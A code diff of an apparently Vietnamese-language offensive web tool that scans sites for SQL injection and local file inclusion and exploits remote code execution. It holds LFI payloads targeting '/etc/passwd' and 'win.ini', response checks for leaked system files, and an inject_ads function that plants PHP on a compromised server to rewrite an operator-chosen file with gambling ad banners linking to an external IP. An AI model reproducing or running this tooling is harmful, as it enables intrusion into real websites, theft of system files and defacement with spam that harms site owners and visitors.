@@ -126,7 +126,7 @@ def find_sqli(url):
                 pass
             print(Fore.YELLOW + url_ + Style.RESET_ALL)
             print("\n")
-            # Kiểm tra xem phản hồi có chứa chuỗi "abcxyz" hay không
+            # Kiem tra co dấu hiệu bị sqli không ( 500 or syntax sql)
             if response.status_code >= 500 or "You have an error in your SQL syntax" in response.text:
                     parsed_url = urllib.parse.urlparse(endpoint)
                     query_params = urllib.parse.parse_qs(parsed_url.query)
@@ -177,7 +177,7 @@ def find_sqli(url):
 
 
     print("Kiểm tra hoàn tất.")
-    # Xuất ra tất cả các lỗi xss tìm được
+    # Xuất ra tất cả các lỗi sqli tìm được
     print("-------------- Các lỗ hỏng SQL injection ------------")
     for vuln in vulns :
          print(Fore.RED + f"{vuln}\n" + Style.RESET_ALL)
@@ -206,7 +206,7 @@ def find_file_inclusion(url):
                 pass
             print(Fore.YELLOW + url + Style.RESET_ALL)
             print("\n")
-            # Kiểm tra xem phản hồi có chứa chuỗi "abcxyz" hay không
+            # Kiểm tra xem phản hồi có chứa chuỗi "root:x:0" hay không
             if "root:x:0" in response.text or "[extensions]" in response.text:
                 print(Fore.RED + f"{endpoint}     -->   File inclusion \n" + Style.RESET_ALL)
                 endpoint_LFI.append(endpoint)
@@ -254,18 +254,31 @@ def find_file_inclusion(url):
 # Chèn quảng cáo vào trang chủ index.php
 def inject_ads(url):
     print("Đang chèn quảng cáo qua lỗ hổng RCE...")
+    file = input('Tên file muốn chèn:')
+    php_code =f"""<?php
+$file_path = '{file}';
 
-    php_code ="""<?php
-    $file_path = 'index.php';
+$content = file_get_contents($file_path);
 
-    $content = file_get_contents($file_path);
+$new_content = str_replace('<body>', '<body> <div class="row" bis_skin_checked="1">
+    <div class="col-12 p-0" bis_skin_checked="1">		
+        <p class="mb-1">
+            <a target="_blank" rel="nofollow" href="https://15.235.211.177/xoilac" title="8XBET" bis_size="{{&quot;x&quot;:376,&quot;y&quot;:79,&quot;w&quot;:1156,&quot;h&quot;:18,&quot;abs_x&quot;:376,&quot;abs_y&quot;:79}}">
+                <img class="img-fluid" src="https://cdn.lfastcdn.com/2024/11/13asd8.gif" alt="8XBET" bis_size="{{&quot;x&quot;:376,&quot;y&quot;:64,&quot;w&quot;:1156,&quot;h&quot;:52,&quot;abs_x&quot;:376,&quot;abs_y&quot;:64}}" bis_id="bn_sd9utvkwy1qcg9m9jdbupg">
+            </a>
+        </p>
+        <p class="mb-1">
+            <a target="_blank" rel="nofollow" href="https://15.235.211.177/xoilac" title="8XBET" bis_size="{{&quot;x&quot;:376,&quot;y&quot;:136,&quot;w&quot;:1156,&quot;h&quot;:18,&quot;abs_x&quot;:376,&quot;abs_y&quot;:136}}">
+                <img class="img-fluid" src="https://cdn.lfastcdn.com/2024/11/13asd8.gif" alt="8XBET" bis_size="{{&quot;x&quot;:376,&quot;y&quot;:120,&quot;w&quot;:1156,&quot;h&quot;:52,&quot;abs_x&quot;:376,&quot;abs_y&quot;:120}}" bis_id="bn_338eag8ba2x21yxk37525d">
+            </a>
+        </p>
+    </div>
+</div>', $content);
 
-    $new_content = str_replace('<body>', '<body> <div id="chilladv" class="container"> <div id="headerpcads"><div class="hidemobile"><center><a target="_blank" rel="nofollow" href="https://tinyurl.com/dabet-phimmoichill-topbanner"><img class=" ls-is-cached lazyloaded" src="https://phimmoichilltv.net/newchill/vn88_pc.gif" height="60px" width="50%" alt=""></a><a target="_blank" rel="nofollow" href="https://6686vn.biz/dl30"><img class=" ls-is-cached lazyloaded" src="https://phimmoichilltv.net/newchill/66_pc.gif" height="60px" width="50%" alt=""></a><br><a target="_blank" rel="nofollow" href="https://tinyurl.com/phimmoichill-vn88"><img class=" ls-is-cached lazyloaded" src="https://phimmoichilltv.net/newchill/vn88_pc.gif" height="60px" width="728px" alt=""></a></center></div></div> <div id="headermbads"><div class="hidedesktop"><center><a target="_blank" rel="nofollow" href="https://tinyurl.com/dabet-phimmoichill-topbanner"><img class=" ls-is-cached lazyloaded" src="https://phimmoichilltv.net/newchill/da_mb.gif" height="40px" width="320px" alt=""></a><br><a target="_blank" rel="nofollow" href="https://6686vn.biz/dl30"><img class=" ls-is-cached lazyloaded" src="https://phimmoichilltv.net/newchill/66_mb.gif" height="40px" width="320px" alt=""></a><br><a target="_blank" rel="nofollow" href="https://tinyurl.com/phimmoichill-vn88"><img class=" ls-is-cached lazyloaded" src="https://phimmoichilltv.net/newchill/vn88_mb.gif" height="40px" width="320px" alt=""></a></center></div> </div> </div>', $content);
-
-    file_put_contents($file_path, $new_content);
-    echo 'Success!';
-    ?>
-    """
+file_put_contents($file_path, $new_content);
+echo 'Success!';
+?>
+"""
 
     host =get_host(url)
     try:
@@ -287,12 +300,12 @@ def inject_ads(url):
 
     response = requests.get(new_url)
     if "Success!" in response.text:
-        print("Tệp index.php đã được thay đổi thành công!")
+        print("Tệp đã được thay đổi thành công!")
     else:
-        print("Tệp index.php thay đổi không thành công!!!")
+        print("Tệp thay đổi không thành công!!!")
 
 
-#Tạo payload để tìm SQL injection
+#Tạo payload để tìm LFI
 def generate_payload_test_File_inclusion(url_web):
 
     payload_file_inclusion = ["../../../../etc/passwd","/etc/passwd","C:/Windows/win.ini"]
@@ -324,7 +337,7 @@ def generate_payload_test_File_inclusion(url_web):
                         endpoints.append(new_url)
 
 
-
+#recon
 def recon_web(url):
     
 
